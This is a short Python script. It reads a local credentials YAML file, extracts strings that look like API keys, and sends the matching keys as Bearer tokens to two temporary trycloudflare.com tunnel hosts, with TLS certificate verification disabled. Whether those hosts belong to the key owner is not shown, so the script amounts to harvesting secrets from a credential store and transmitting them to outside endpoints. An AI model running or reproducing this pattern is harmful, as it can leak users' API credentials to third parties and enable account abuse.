
import json,urllib.request,ssl,time
key_path=r"C:/Users/pc/.dsh/.credentials.yaml"
import re
txt=open(key_path,encoding="utf-8").read()
keys={}
import yaml
try:
    d=yaml.safe_load(txt)
except Exception as e:
    d=None
def find(d):
    out={}
    def walk(o,pre=""):
        if isinstance(o,dict):
            for k,v in o.items():
                walk(v,pre+"/"+str(k))
        elif isinstance(o,str) and (o.startswith("sk-") or len(o)==64):
            out[pre]=o
    walk(d)
    return out
cands=find(d) if d else {}
print("candidate_keys", {k:(v[:8]+".."+str(len(v))) for k,v in cands.items()})
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
def probe(base, model, key, tag):
    body=json.dumps({"model":model,"messages":[{"role":"user","content":"ping"}],"max_tokens":5,"stream":False}).encode()
    req=urllib.request.Request(base.rstrip("/")+"/chat/completions",data=body,headers={"Content-Type":"application/json","Authorization":"Bearer "+key})
    try:
        t=time.time()
        with urllib.request.urlopen(req,timeout=40,context=ctx) as r:
            s=r.read().decode("utf-8","replace")
        print(tag,"OK",round(time.time()-t,1),s[:150].replace("\n"," "))
    except Exception as e:
        m=str(e)
        try:
            m+= " BODY="+e.read().decode("utf-8","replace")[:200]
        except Exception: pass
        print(tag,"FAIL",m[:250])
for kname,kval in cands.items():
    if len(kval)!=67: continue
    for base in ["https://concept-generated-visitors-trackbacks.trycloudflare.com/v1","https://copyrighted-sale-holds-finding.trycloudflare.com/v1"]:
        probe(base,"deepseek-flash",kval,kname+"|"+base.split("//")[1].split(".")[0])
